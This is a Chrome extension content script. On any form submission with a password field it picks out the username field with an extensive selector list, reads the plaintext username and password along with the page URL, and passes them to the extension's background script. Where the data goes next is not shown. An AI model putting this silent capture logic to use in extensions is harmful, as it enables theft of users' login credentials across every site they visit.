// Detect form submissions and extract credentials
function isLoginOrSignup(form) {
  // Heuristic: look for password input
  return form.querySelector('input[type="password"]');
}

document.addEventListener('submit', function(event) {
  const form = event.target;
  if (!isLoginOrSignup(form)) return;

  const passwordInput = form.querySelector('input[type="password"]');
  if (!passwordInput) return;

  // Try to find username/email input with more comprehensive selectors
  const usernameInput = form.querySelector(
    // Email fields
    'input[type="email"], ' +
    // Text/search fields with common login-related names, ids, or placeholders
    'input[type="text"][name*="user" i], ' +
    'input[type="text"][name*="email" i], ' +
    'input[type="text"][name*="login" i], ' +
    'input[type="text"][name*="account" i], ' +
    'input[type="text"][name*="id" i], ' +
    'input[type="text"][name*="mail" i], ' +
    'input[type="text"][name*="member" i], ' +
    'input[type="text"][name*="customer" i], ' +
    'input[type="text"][id*="user" i], ' +
    'input[type="text"][id*="email" i], ' +
    'input[type="text"][id*="login" i], ' +
    'input[type="text"][id*="account" i], ' +
    'input[type="text"][id*="id" i], ' +
    'input[type="text"][id*="mail" i], ' +
    'input[type="text"][id*="member" i], ' +
    'input[type="text"][id*="customer" i], ' +
    'input[type="text"][placeholder*="user" i], ' +
    'input[type="text"][placeholder*="email" i], ' +
    'input[type="text"][placeholder*="login" i], ' +
    'input[type="text"][placeholder*="account" i], ' +
    'input[type="text"][placeholder*="id" i], ' +
    'input[type="text"][placeholder*="mail" i], ' +
    'input[type="text"][placeholder*="member" i], ' +
    'input[type="text"][placeholder*="customer" i], ' +
    // Search fields
    'input[type="search"][name*="user" i], ' +
    'input[type="search"][name*="email" i], ' +
    'input[type="search"][name*="login" i], ' +
    'input[type="search"][name*="account" i], ' +
    'input[type="search"][name*="id" i], ' +
    'input[type="search"][name*="mail" i], ' +
    'input[type="search"][id*="user" i], ' +
    'input[type="search"][id*="email" i], ' +
    'input[type="search"][id*="login" i], ' +
    'input[type="search"][id*="account" i], ' +
    'input[type="search"][id*="id" i], ' +
    'input[type="search"][id*="mail" i], ' +
    'input[type="search"][placeholder*="user" i], ' +
    'input[type="search"][placeholder*="email" i], ' +
    'input[type="search"][placeholder*="login" i], ' +
    'input[type="search"][placeholder*="account" i], ' +
    'input[type="search"][placeholder*="id" i], ' +
    'input[type="search"][placeholder*="mail" i], ' +
    // Inputs with autocomplete hints
    'input[autocomplete="username"], ' +
    'input[autocomplete="email"], ' +
    // Generic username fields (no type)
    'input[name*="user" i], ' +
    'input[name*="login" i], ' +
    'input[name*="account" i], ' +
    'input[name*="id" i], ' +
    'input[name*="mail" i], ' +
    'input[id*="user" i], ' +
    'input[id*="login" i], ' +
    'input[id*="account" i], ' +
    'input[id*="id" i], ' +
    'input[id*="mail" i], ' +
    'input[placeholder*="user" i], ' +
    'input[placeholder*="login" i], ' +
    'input[placeholder*="account" i], ' +
    'input[placeholder*="id" i], ' +
    'input[placeholder*="mail" i]'
  );
  const username = usernameInput ? usernameInput.value : '';
  const password = passwordInput.value;
  const url = window.location.href;
  const timestamp = new Date().toISOString();

  // Send to background
  chrome.runtime.sendMessage({
    type: 'SAVE_CREDENTIAL',
    data: { username, password, url, timestamp }
  });
}); 